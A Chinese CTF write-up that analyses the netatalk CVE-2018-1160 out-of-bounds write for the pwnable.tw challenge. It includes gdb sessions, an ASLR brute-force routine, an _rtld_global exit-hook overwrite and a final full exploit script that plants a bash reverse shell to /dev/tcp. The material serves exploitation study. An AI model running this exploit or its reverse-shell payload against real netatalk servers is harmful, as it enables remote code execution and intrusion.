---
title: 和徐老一起学Pwn 之 Pwnable CVE-2018-1160
categories:
- CTF/Pwn
tags: 
---

> 更新中...和徐老一起完成，HITCON2019时为netatalk的1day，漏洞是由于memcpy长度没限制导致可覆盖关键变量，最终可导致有一次任意地址写，主要挑战为绕过ASLR。由于程序通过fork出一个子进程来处理每一个连接，所以在任意地址写时，可从低到高逐字节的覆盖并爆破原本的合法地址。比较麻烦的是，因为没有和Pwnable远程题目一模一样的环境，所以从合法地址到libc基址仍需要再爆破一次。最后通过覆写位于ld.so数据段_rtld_global结构体，并在程序超时退出时（远程tcp close后需要三分钟），完成控制流劫持并反弹shell。

## 简介

这个洞是2018年被发现，2019年被用到了HITCON Quals上，后又被收录到Pwnable.tw。所以主要有以下三部分文章：

- 原文：[Exploiting an 18 Year Old Bug](https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172)
- 翻译：[Netatalk CVE-2018-1160的发现与利用](https://blog.csdn.net/weixin_43483799/article/details/113856715)
- 复现：[Netatalk CVE-2018–1160 越界写漏洞分析](https://xz.aliyun.com/t/3710)


hitcon相关：

- [HITCON CTF 2019 Pwn 371 Netatalk](https://ddaa.tw/hitconctf_pwn_371_netatalk.html)
- [HITCON CTF 2019 Quals netatalk by balsn](https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#netatalk)


Pwnable相关：

- [CVE-2018-1160 netatalk越界漏洞复现及分析](https://ama2in9.top/2021/01/07/cve-2018-1160/)
- [Netatalk CVE-2018-1160 分析](https://ruan777.github.io/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/)
- [CVE-2018-1160: Expanding the original 18 year old vulnerability exploit](https://tacopwn.net/blog/2021/08/02/cve-2018-1160-expanding-the-original-18-year-old-vulnerability-exploit/)
- [pwnable.tw CVE-2018-1160 Write up](https://katolik-xixon.tistory.com/244)

以上文章写过的我基本就简写了，补充些分析过程以及做题细节。

## 分析

### 漏洞

> 题目给了二进制、配置文件、需要的运行库，所以不需要编译以及安装其他依赖即可运行。

源码：[https://sourceforge.net/projects/netatalk/files/netatalk/3.1.11/](https://sourceforge.net/projects/netatalk/files/netatalk/3.1.11/)

主要目标二进制是：afpd、libatalk.so.18，他们在源码中的路径是：

- **/netatalk-3.1.11/etc/afpd/**
- **/netatalk-3.1.11/libatalk/**

漏洞点在 **/netatalk-3.1.11/libatalk/dsi/dsi_opensess.c** 的 **dsi_opensession** 函数中的 **memcpy**：

```c
/* /netatalk-3.1.11/libatalk/dsi/dsi_opensess.c */

void dsi_opensession(DSI *dsi)
{
  ...
  while (i < dsi->cmdlen) {
    switch (dsi->commands[i++]) {
    case DSIOPT_ATTNQUANT:
      memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);
      dsi->attn_quantum = ntohl(dsi->attn_quantum);
  ...
```

其中memcpy的长度参数 **dsi->commands\[i\]** 由外部传入，且没检查大小，导致可溢出到DSI结构体中attn_quantum的后续成员。

```c
/* /netatalk-3.1.11/include/atalk/dsi.h */

#define DSI_DATASIZ       65536

typedef struct DSI {
    ...
    uint32_t attn_quantum, datasize, server_quantum;
    uint16_t serverID, clientID;
    uint8_t  *commands; /* DSI recieve buffer */
    uint8_t  data[DSI_DATASIZ];    /* DSI reply buffer */
```

但可见成员 **commands** 的类型为uint8_t*，所以memcpy的最大长度是0xff。并且由于 **DSI_DATASIZ** 为65535，所以溢出部分data后就无法向后溢出了，故最终只能溢出如上这些成员变量。

### 交互

开始看这个memcpy的参数一头雾水，为啥拷贝的源地址，和长度都与 **dsi->commands** 相关：

```c
switch (dsi->commands[i++]) {
case DSIOPT_ATTNQUANT:
    memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);
```

而且开头还有个switch里++，越看越费解。所以首先我应该知道dsi是个啥。在源码中没有查到dsi全称，然后发现漏洞原文中有wireshark的截图，并且可以看到wireshark支持解析这个协议，那应该是个挺标准的协议。Google搜索 **dsi_opensession protocol** 即可搜到：[Data Stream Interface](https://en.wikipedia.org/wiki/Data_Stream_Interface)，对照其协议格式，和漏洞PoC：

![image](https://xuanxuanblingbling.github.io/assets/pic/netatalk/poc.png)


发现，PoC中的header就是符合dsi协议的字段，协议中的Payload就是PoC中的commands，可看到commands的构成是：

```python
commands = "\x01"   # DSIOPT_ATTNQUANT 选项的值
commands += "\x80"  # 数据长度
commands += "\xaa" * 0x80
```

再对应memcpy，基本就能看明白了：

```c
switch (dsi->commands[i++]) {
case DSIOPT_ATTNQUANT:
    memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);
```

其中DSIOPT_ATTNQUANT为0x1：

```c
/* /netatalk-3.1.11/include/atalk/dsi.h */

#define DSIOPT_ATTNQUANT 0x01   /* attention quantum */
```

所以memcpy就是从commands数据中按顺序解析出三个元素：功能码，数据长度，数据载荷。所以，也就是由于拷贝的需要的两个参数是揉在一段数据里，并且没有变量名标识，导致看起来比较费解：

```c
commands = 功能码(1 byte) + 数据长度(1 byte) + 数据载荷(n byte)
```


故最终交互，就是构造dsi数据包，并给发送给目标的tcp端口。尝试溢出server_quantum，这个字段可在回包中收到：

```python
from pwn import *
context(endian='big',log_level='debug')
io = remote("chall.pwnable.tw",10002)

cmd  = b'\x01'+ p8(0xc)+ b'a'*0xc
dsi  = b'\x00\x04\x00\x01' 
dsi += p32(0)
dsi += p32(len(cmd)) 
dsi += p32(0)
dsi += cmd

io.send(dsi)
io.recv()
```

测试的确可以收到4个a：

```python
➜   python3 exp.py
[+] Opening connection to chall.pwnable.tw on port 10002: Done
[DEBUG] Sent 0x1e bytes:
    00000000  00 04 00 01  00 00 00 00  00 00 00 0e  00 00 00 00  │····│····│····│····│
    00000010  01 0c 61 61  61 61 61 61  61 61 61 61  61 61        │··aa│aaaa│aaaa│aa│
    0000001e
[DEBUG] Received 0x1c bytes:
    00000000  01 04 00 01  00 00 00 00  00 00 00 0c  00 00 00 00  │····│····│····│····│
    00000010  00 04 61 61  61 61 02 04  00 00 00 80               │··aa│aa··│····│
    0000001c
[*] Closed connection to chall.pwnable.tw port 10002
```

如果想看到清晰的协议格式，可以用wireshark，但因为端口不是协议默认，故需要手动让其识别：

![image](https://xuanxuanblingbling.github.io/assets/pic/netatalk/wireshark.png)


### 调试

上面的交互的确看起来是触发了漏洞并覆盖了变量，不过想看到内存破坏还是得gdb调试。首先本地启动目标程，题目给的libc是2.27，所以使用ubuntu18.04的虚拟机：

```c
➜  LD_PRELOAD="./libatalk.so.18"  ./afpd -d -F ./afp.conf
```

然后检查一下端口情况，成功运行：

```c
➜  sudo netstat -pantu | grep 5566
tcp6    0    0 :::5566     :::*    LISTEN     123345/./afpd    
```

由于我们每次攻击的是fork出来的子进程，所以需要让gdb跟着子进程：

```c
➜  sudo gdb --pid 123345 -q

gef➤  set follow-fork-mode child
gef➤  c
```

然后打一发会引发内存破坏的PoC:

```python
from pwn import *
context(endian='big',log_level='debug')
io = remote("127.0.0.1",5566)

cmd  = b'\x01'+ p8(0x80)+ b'a'*0x80
dsi  = b'\x00\x04\x00\x01' 
dsi += p32(0)
dsi += p32(len(cmd)) 
dsi += p32(0)
dsi += cmd

io.send(dsi)
io.recv()
```

gdb窗口成功进入子进程并崩溃在dsi_opensession中：

```python
gef➤  c
Continuing.
[New process 123552]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Thread 2.1 "afpd" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f863b8e7740 (LWP 123552)]
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x61616161        
$rbx   : 0x0000563fcd14df00  →  0x0000000000000000
$rcx   : 0x6161616161616161 ("aaaaaaaa"?)
$rdx   : 0x0               
$rsp   : 0x00007ffce77c8840  →  0x0000000000000000
$rbp   : 0x0000563fcd14df00  →  0x0000000000000000
$rsi   : 0x00007f863b7e6092  →  0x0000000000000000
$rdi   : 0x0000563fcd14e658  →  0x0000000000000000
$rip   : 0x00007f863b486fbb  →  <dsi_opensession+139> movzx eax, BYTE PTR [rcx+r9*1]
$r8    : 0x0000563fcd14e5d8  →  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$r9    : 0x1               
$r10   : 0x25              
$r11   : 0x293             
$r12   : 0x0000563fcd14a8b0  →  0x0000563fcd14a9f0  →  0x0000000000000000
$r13   : 0x1e              
$r14   : 0x00007ffce77c8940  →  0x0000000000000000
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffce77c8840│+0x0000: 0x0000000000000000	 ← $rsp
0x00007ffce77c8848│+0x0008: 0x00007f863b486c63  →  <dsi_getsession+467> mov QWORD PTR [r14], 0x0
0x00007ffce77c8850│+0x0010: 0x0000000000000000
0x00007ffce77c8858│+0x0018: 0x0000000600000005
0x00007ffce77c8860│+0x0020: 0x0000000000000000
0x00007ffce77c8868│+0x0028: 0x0000000000000000
0x00007ffce77c8870│+0x0030: 0x0000000000000000
0x00007ffce77c8878│+0x0038: 0x0000000000000000
────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f863b486fad <dsi_opensession+125> mov    eax, DWORD PTR [rbx+0x6d8]
   0x7f863b486fb3 <dsi_opensession+131> bswap  eax
   0x7f863b486fb5 <dsi_opensession+133> mov    DWORD PTR [rbx+0x6d8], eax
 → 0x7f863b486fbb <dsi_opensession+139> movzx  eax, BYTE PTR [rcx+r9*1]
   0x7f863b486fc0 <dsi_opensession+144> lea    esi, [rdx+rax*1+0x2]
   0x7f863b486fc4 <dsi_opensession+148> cmp    rsi, QWORD PTR [rbx+0x106f8]
   0x7f863b486fcb <dsi_opensession+155> mov    rdx, rsi
   0x7f863b486fce <dsi_opensession+158> jb     0x7f863b486f80 <dsi_opensession+80>
   0x7f863b486fd0 <dsi_opensession+160> mov    QWORD PTR [rbx+0x106f8], 0xc
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "afpd", stopped 0x7f863b486fbb in dsi_opensession (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f863b486fbb → dsi_opensession()
[#1] 0x7f863b486c63 → dsi_getsession()
[#2] 0x563fcc883645 → main()
───────────────────────────────────────────────────────────────────────────────────────────
0x00007f863b486fbb in dsi_opensession () from ./libatalk.so.18
gef➤
```

死因很明显，对rcx(0x6161616161616161)这个非法地址解引用了。接下来定位一下我们覆盖的目标结构体在哪：

```python
from pwn import *
context(endian='big',log_level='debug')
io = remote("127.0.0.1",5566)

cmd  = b'\x01'+ p8(0xc)+ b'a'*0x8+'xuan'
dsi  = b'\x00\x04\x00\x01' 
dsi += p32(0)
dsi += p32(len(cmd)) 
dsi += p32(0)
dsi += cmd

io.send(dsi)
io.recv()
```

由于父进程不会死，所以很方便，还是原来的命令，断点直接打在刚才死的位置，打完exp后成功断下：

```python
➜  sudo gdb --pid 123345 -q
gef➤  set follow-fork-mode child
gef➤  b * 0x7f863b486fbb
gef➤  c
Continuing.
[New process 123664]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Switching to Thread 0x7f863b8e7740 (LWP 123664)]

Thread 2.1 "afpd" hit Breakpoint 1, 0x00007f863b486fbb in dsi_opensession () from ./libatalk.so.18
```

全局搜索特征串xuan，分析后，rdi寄存器的值，也即0x563fcd14e5e0，就是结构中server_quantum的位置：

```python
gef➤  grep xuan
[+] Searching 'xuan' in memory
[+] In '[heap]'(0x563fcd12c000-0x563fcd16e000), permission=rw-
  0x563fcd14e5e0 - 0x563fcd14e5e4  →   "xuan" 
[+] In (0x7f863b7e6000-0x7f863b8e7000), permission=rw-
  0x7f863b7e601a - 0x7f863b7e601e  →   "xuan" 

gef➤  x /20gx 0x563fcd14e5e0
0x563fcd14e5e0:	0x000100006e617578	0x00007f863b7e6010
0x563fcd14e5f0:	0x0000000000000000	0x0000000000000000
0x563fcd14e600:	0x0000000000000000	0x0000000000000000
```

对应结构体：

```c
/* /netatalk-3.1.11/include/atalk/dsi.h */

#define DSI_DATASIZ       65536

typedef struct DSI {
    ...
    uint32_t attn_quantum, datasize, server_quantum;
    uint16_t serverID, clientID;
    uint8_t  *commands; /* DSI recieve buffer */
    uint8_t  data[DSI_DATASIZ];    /* DSI reply buffer */
```

故位于**0x563fcd14e5e8**的**0x00007f863b7e6010**就是**commands**，根据程序内存布局，梳理一下变量：


```python
...
0x0000563fcc879000 0x0000563fcc8bb000 0x0000000000000000 r-x /mnt/hgfs/桌面/CVE-2018-1160/afpd
0x0000563fccaba000 0x0000563fccabc000 0x0000000000041000 r-- /mnt/hgfs/桌面/CVE-2018-1160/afpd
0x0000563fccabc000 0x0000563fccabf000 0x0000000000043000 rw- /mnt/hgfs/桌面/CVE-2018-1160/afpd
0x0000563fccabf000 0x0000563fccade000 0x0000000000000000 rw- 
0x0000563fcd12c000 0x0000563fcd16e000 0x0000000000000000 rw- [heap]
0x00007f86354f5000 0x00007f86360f6000 0x0000000000000000 rw- 
...
0x00007f863b6ef000 0x00007f863b718000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f863b7e6000 0x00007f863b8e7000 0x0000000000000000 rw- 
0x00007f863b8e7000 0x00007f863b8f8000 0x0000000000000000 rw- 
0x00007f863b916000 0x00007f863b918000 0x0000000000000000 rw- 
0x00007f863b918000 0x00007f863b919000 0x0000000000029000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f863b919000 0x00007f863b91a000 0x000000000002a000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f863b91a000 0x00007f863b91b000 0x0000000000000000 rw- 
...
```

- dsi结构体，其中成员位于0x563fcd14e5e0，这是堆段
- commands指向的内存为0x7f863b7e6010，位于ld.so后面的数据段，目前不详这段内存是啥

所以本次memcpy的漏洞不能触发堆溢出，能想到，主要的玩法就在这个能被覆盖的commands指针上了。

### 源码

要想彻底明白漏洞本身以及利用方法，自然少不了看源码，最主要的是要看明白被覆盖变量的内存位置，用法，以及生命周期。这里简略的记录了一些动作的调用路径：

> 连接初始化

```c
[afpd] main -> configinit -> dsi_init

[libatalk] dsi_init -> dsi_tcp_init ->  dsi->proto_open = dsi_tcp_open
```

> 连接

```c
[afpd] main -> dsi_start -> dsi_getsession

[libatalk] dsi_getsession  -> dsi->proto_open -> dsi_tcp_open -> fork
```

> bug

```c
[afpd] main -> dsi_start -> dsi_getsession

[libatalk] dsi_getsession -> dsi_opensession (bug!!!)
```

> dsi->commands 初始化

```c
[afpd] main -> dsi_start -> dsi_getsession

[libatalk] dsi_getsession  -> dsi->proto_open -> dsi_tcp_open ->

           dsi_init_buffer -> dsi->commands = malloc(dsi->server_quantum)

// 故一个tcp连接init一次dsi->commands

// 值得注意的是
// 由于server_quantum被初始化为0x100000，为1024k，大于128k
// 故对dsi->commands初始化时指向的malloc内存由mmap分配
// 这就解释了上文commands指向0x7f863b7e6010的原因
```

>  exploit 

```c
// dsi_stream_write:    just write a bunch of bytes.
// dsi_stream_read:     just read a bunch of bytes.
// dsi_stream_send:     send a DSI header + data.
// dsi_stream_receive:  read a DSI header + data.


[afpd] main -> dsi_start -> afp_over_dsi -> dsi_stream_receive

[libatalk] dsi_stream_receive -> dsi_stream_read(dsi, dsi->commands, dsi->cmdlen)

// 故修改完commands指针后，在本次tcp中再发一个包就可以任意地址写了，数据内容在dsi中的payload，不包括header
```

## 解题

### 速度

由于连接题目远程很慢，根据题目信息，其服务器是[linode](https://www.linode.com/)提供的，检查ip在日本东京，所以如果使用相同机房的服务器进行解题，则会快很多。买与题目内核版本相同的日本的服务器，测试速度：

```c
root@localhost:~# ping chall.pwnable.tw
PING chall.pwnable.tw 139.162.123.119 56(84) bytes of data.
64 bytes from  139.162.123.119: icmp_seq=1 ttl=63 time=0.801 ms
64 bytes from  139.162.123.119: icmp_seq=2 ttl=63 time=1.03 ms
64 bytes from  139.162.123.119: icmp_seq=3 ttl=63 time=0.853 ms
64 bytes from  139.162.123.119: icmp_seq=4 ttl=63 time=0.743 ms
64 bytes from  139.162.123.119: icmp_seq=5 ttl=63 time=0.622 ms
```

### 爆破

以前面的数据为例，commands指向0x7f863b7e6010，根据观察可知，这个地址和动态库的地址很像，至少7f863，这两个半字节是完全一致的，具体分析一下：

```c
0x7f863b7e6010 // commands地址
0x7f8630000000 // 有效高位两个半字节地址
0x7f863????000 // 所有段的基址都是4k页对齐
```

则如果能拿到一个有效的高两个半字节，最差的情况爆破65536次，必能爆出libc的基址，故首先爆破一个可写的合法地址：

> 设计了中间第3-6个字节从0xff向0x00爆破，其余从0x00向0xff爆破的策略，在本地能比较准的拿到mmap的地址

```python
from pwn import *
context(endian='big')

leak_addr = b''
for j in range(8):
    for i in range(256):
        if(j>1 and j<6): i = 255 - i
        io = remote("chall.pwnable.tw",10002)
        payload  = b'\x01'+ p8(0x11+j)+ b'a'*0x10 + leak_addr + p8(i)
        dsi  = b'\x00\x04\x00\x01'
        dsi += p32(0)
        dsi += p32(len(payload))
        dsi += p32(0)
        dsi += payload
        io.send(dsi)
        try:
            a = io.recv()
            leak_addr += p8(i)
            log.success(str(hex(i)))
            io.close()
            break
        except:
            io.close()
log.success(hex(u64(leak_addr,endian='little')))
```

2021.11.6 对 pwnable.tw 爆破的结果为：

```python
[*] Closed connection to chall.pwnable.tw port 10002
[+] 0x7fa9bcc90000
```

如果认为这个地址是mmap的地址，那么libc地址应该比他小，因为这个mmap在ld.so后面，所以对libc的爆破为：

```python
leak_addr = 0x7fa9bcc90000
for i in range(0x0000000,0xffff000,0x1000):
    libc_addr = leak_addr - i 
```

于是遇到了问题，你怎么知道你libc爆破对了？所以需要先确立打法，然后爆破libc并攻击，直到打成为止。

### 利用

#### 任意地址写

所以先在本地搞一下任意地址写，直接测试对爆破出来的合法地址写：

```python
from pwn import *
context(endian='little')

ip   = "127.0.0.1"
port = 5566

def gen_dsi(data):
    dsi  = b'\x00\x04\x00\x01'
    dsi += p32(0)
    dsi += p32(len(data),endian='big')
    dsi += p32(0)
    dsi += data
    return dsi

def aaw(io,addr,data):
    payload  = b'\x01'+ p8(0x18)+ b'a'*0x10 + p64(addr)
    io.send(gen_dsi(payload))
    io.recv()
    io.send(gen_dsi(data))

def boom():
    leak = b''
    for j in range(8):
        for i in range(256):
            if(j>1 and j<6): i = 255 - i
            io = remote(ip,port)
            payload  = b'\x01'+ p8(0x11+j)+ b'a'*0x10 + leak + p8(i)
            io.send(gen_dsi(payload))
            try:
                a = io.recv()
                leak += p8(i)
                log.success(str(hex(i)))
                io.close()
                break
            except:
                io.close()
    return u64(leak)

leak_addr = boom()
log.success(hex(leak_addr))

input()
io = remote(ip,port)
aaw(io,leak_addr,b"xuanxuan")
```

当打印合法地址时，此时会由于input卡住，留出gdb的时间：

```python
[*] Closed connection to 127.0.0.1 port 5566
[+] Opening connection to 127.0.0.1 on port 5566: Done
[+] 0x0
[*] Closed connection to 127.0.0.1 port 5566
[+] 0x7f863b8f6000
```

开gdb：

```python
➜  sudo gdb --pid 123345 -q

gef➤  set follow-fork-mode child
gef➤  c
```

然后exp窗口中回车继续执行，gdb窗口进入子进程，但因为合法地址，不会崩，故ctrl+c暂停进程，然后查看内存，的确写成了：

```python
gef➤  x /2s 0x7f863b8f6000
0x7f863b8f6000:	"xuanxuan"
0x7f863b8f6009:	""
```

但此任意内存写只有一次，因为dsi_getsession在一次tcp连接中只有一次，不过好在这个任意地址写的内容长度可以很大。

#### _rtld_global

按照官方wp的解法，当有了libc的基址后，是可以写_rtld_global的，打法如下：

- [_rtld_global overwrite](https://github.com/andrewbae/gitbook/blob/main/exploitation-techniques/_rtld_global-overwrite.md)
- [exit_hook在pwn题中的应用](https://www.cnblogs.com/bhxdn/p/14222558.html)

主要原理就是程序在exit时会调用一个函数指针，这个函数指针以及参数都在_rtld_global这个结构体里，我之前一直以为这个东西，在libc里，这次才发现他在ld.so的数据段里，这个符号存在于libc的got表中...

```c
.got:00000000003EADE8 _rtld_global_ptr dq offset _rtld_global ; DATA XREF: __libc_start_main+15F↑r
```

还有其他外部符号：

```c
extern:00000000003F0B78 ; Segment type: Externs
extern:00000000003F0B78 ; extern
extern:00000000003F0B78                 extrn _rtld_global      ; DATA XREF: .got:_rtld_global_ptr↑o
extern:00000000003F0B80                 extrn __libc_enable_secure
extern:00000000003F0B80                                         ; DATA XREF: .got:__libc_enable_secure_ptr↑o
extern:00000000003F0B88                 extrn __tls_get_addr:near
extern:00000000003F0B88                                         ; CODE XREF: ___tls_get_addr↑j
extern:00000000003F0B88                                         ; DATA XREF: .got.plt:off_3EB058↑o
extern:00000000003F0B90                 extrn _dl_exception_create:near
extern:00000000003F0B90                                         ; CODE XREF: __dl_exception_create↑j
extern:00000000003F0B90                                         ; DATA XREF: .got.plt:off_3EB080↑o
extern:00000000003F0B98                 extrn _rtld_global_ro   ; DATA XREF: .got:_rtld_global_ro_ptr↑o
extern:00000000003F0BA0                 extrn __tunable_get_val:near
extern:00000000003F0BA0                                         ; CODE XREF: ___tunable_get_val↑j
extern:00000000003F0BA0                                         ; DATA XREF: .got.plt:off_3EB0A0↑o
extern:00000000003F0BA8                 extrn _dl_find_dso_for_object:near
extern:00000000003F0BA8                                         ; CODE XREF: __dl_find_dso_for_object↑j
extern:00000000003F0BA8                                         ; DATA XREF: .got.plt:off_3EB0F8↑o
extern:00000000003F0BB0                 extrn _dl_argv          ; DATA XREF: .got:_dl_argv_ptr↑o
extern:00000000003F0BB8                 extrn _dl_starting_up ; weak
extern:00000000003F0BB8                                         ; DATA XREF: .got:_dl_starting_up_ptr↑o
extern:00000000003F0BB8
```

所以其实libc基址和_rtld_global的偏移并不固定，之前写的[CTF Pwn 题中 libc 可用 函数指针 （攻击位置） 整理](https://xuanxuanblingbling.github.io/ctf/pwn/2021/05/31/libc/)并不准确。经过测试，在系统环境，程序使用的动态库都确定时，其之间的偏移确实固定。也说明，在不管环境版本，以及动态库情况时，仅用libc.so的版本表明其与_rtld_global的偏移是某固定值，这是错误的。比如本题：

```c
gef➤  vmmap libc-2.27
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007f863aa45000 0x00007f863ac2c000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f863ac2c000 0x00007f863ae2c000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f863ae2c000 0x00007f863ae30000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f863ae30000 0x00007f863ae32000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
gef➤  p &_rtld_global
$1 = (struct rtld_global *) 0x7f863b919060 <_rtld_global>
gef➤  p /x 0x7f863b919060-0x00007f863aa45000
$2 = 0xed4060
```

再测一个helloworld：

```c
gef➤  vmmap libc-2.27
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007ffff79e2000 0x00007ffff7bc9000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bc9000 0x00007ffff7dc9000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dc9000 0x00007ffff7dcd000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcd000 0x00007ffff7dcf000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
gef➤  p &_rtld_global
$1 = (struct rtld_global *) 0x7ffff7ffd060 <_rtld_global>
gef➤  p /x 0x7ffff7ffd060-0x00007ffff79e2000
$2 = 0x61b060
```

这其中的差异是ld.so和libc.so中间可能还映射了其他的动态链接库，这个策略应该是内核定的，具体就不详了。

```python
from pwn import *
context(endian='little')

ip   = "10.11.11.3"
port = 5566

def gen_dsi(data):
    dsi  = b'\x00\x04\x00\x01'
    dsi += p32(0)
    dsi += p32(len(data),endian='big')
    dsi += p32(0)
    dsi += data
    return dsi

def aaw(io,addr,data):
    payload  = b'\x01'+ p8(0x18)+ b'a'*0x10 + p64(addr)
    io.send(gen_dsi(payload))
    io.recv()
    io.send(gen_dsi(data))

leak_addr  = 0x7f863b8f6000
libc_addr  = leak_addr - 0xeb1000
rtld       = libc_addr + 0xed4060

io = remote(ip,port)
cmd = b'xuanxuan'
aaw(io,rtld+2312,cmd.ljust(0x5f8,b'\x00')+p64(0xdeadbeef))
```

```c
gef➤  set follow-fork-mode child
gef➤  c
Continuing.
[New process 3871]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
^C
Thread 2.1 "afpd" received signal SIGINT, Interrupt.
[Switching to Thread 0x7f863b8e7740 (LWP 3871)]
```

```c
gef➤  p exit(0)

Thread 2.1 "afpd" received signal SIGALRM, Alarm clock.

Thread 2.1 "afpd" received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007f863b919060  →  0x00007f863b91a170  →  0x0000563fcc879000  →   jg 0x563fcc879047
$rbx   : 0x00007f863b919060  →  0x00007f863b91a170  →  0x0000563fcc879000  →   jg 0x563fcc879047
$rcx   : 0x1               
$rdx   : 0x00007f863b6ffb40  →  <_dl_fini+0> push rbp
$rsp   : 0x00007ffce77c8738  →  0x00007f863b6ffbaf  →  <_dl_fini+111> mov edx, DWORD PTR [rbx+0x8]
$rbp   : 0x00007ffce77c8790  →  0x0000000000000000
$rsi   : 0x0               
$rdi   : 0x00007f863b919968  →  "xuanxuan"
$rip   : 0xdeadbeef        
$r8    : 0x1               
$r9    : 0x0               
$r10   : 0x00007ffce77c8690  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x1               
$r14   : 0x00007f863ae35708  →  0x0000000000000000
$r15   : 0x00007f863ae31d80  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffce77c8738│+0x0000: 0x00007f863b6ffbaf  →  <_dl_fini+111> mov edx, DWORD PTR [rbx+0x8]	 ← $rsp
0x00007ffce77c8740│+0x0008: 0x0000000000000000
0x00007ffce77c8748│+0x0010: 0x0000000000000000
0x00007ffce77c8750│+0x0018: 0x0000000000000000
0x00007ffce77c8758│+0x0020: 0x0000000000000000
0x00007ffce77c8760│+0x0028: 0x0000000000000000
0x00007ffce77c8768│+0x0030: 0x0000000000000001
0x00007ffce77c8770│+0x0038: 0x00007f863ae30718  →  0x00007f863ae31d80  →  0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0xdeadbeef
───────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "afpd", stopped 0xdeadbeef in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────── trace ───
0x00000000deadbeef in ?? ()
The program being debugged was signaled while in a function called from GDB.
GDB remains in the frame where the signal was received.
To change this behavior use "set unwindonsignal on".
Evaluation of the expression containing the function
(__GI_exit) will be abandoned.
When the function is done executing, GDB will silently stop.
gef➤  
```


#### 远程完整exp

在[pwnable.tw CVE-2018-1160 Write up](https://katolik-xixon.tistory.com/244)中，提到远程版本为[ubuntu18.04.1](http://old-releases.ubuntu.com/releases/18.04.1/)，下载相同镜像，测试题目情况下，libc基址与_rtld_global偏移为 **0xed2060**

```python
from pwn import *
context(endian='little')

ip   = "chall.pwnable.tw"
port = 10002
libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")

def gen_dsi(data):
    dsi  = b'\x00\x04\x00\x01'
    dsi += p32(0)
    dsi += p32(len(data),endian='big')
    dsi += p32(0)
    dsi += data
    return dsi

def aaw(io,addr,data):
    payload  = b'\x01'+ p8(0x18)+ b'a'*0x10 + p64(addr)
    io.send(gen_dsi(payload))
    io.recv()
    io.send(gen_dsi(data))

def boom():
    leak = b''
    for j in range(8):
        for i in range(256):
            if(j>1 and j<6): i = 255 - i
            io = remote(ip,port)
            payload  = b'\x01'+ p8(0x11+j)+ b'a'*0x10 + leak + p8(i)
            io.send(gen_dsi(payload))
            try:
                a = io.recv()
                leak += p8(i)
                log.success(str(hex(i)))
                io.close()
                break
            except:
                io.close()
    return u64(leak)

leak_addr = boom()

for i in range(0x0000000,0xffff000,0x1000):
    libc.address = leak_addr - i
    rtld = libc.address + 0xed2060
    cmd = b'bash -c "bash  -i>& /dev/tcp/ip/port 0<&1"'
    try:
        io = remote(ip,port)
        aaw(io,rtld+2312,cmd.ljust(0x5f8,b'\x00')+p64(libc.symbols['system']))
        io.close()
    except:
        io.close()
```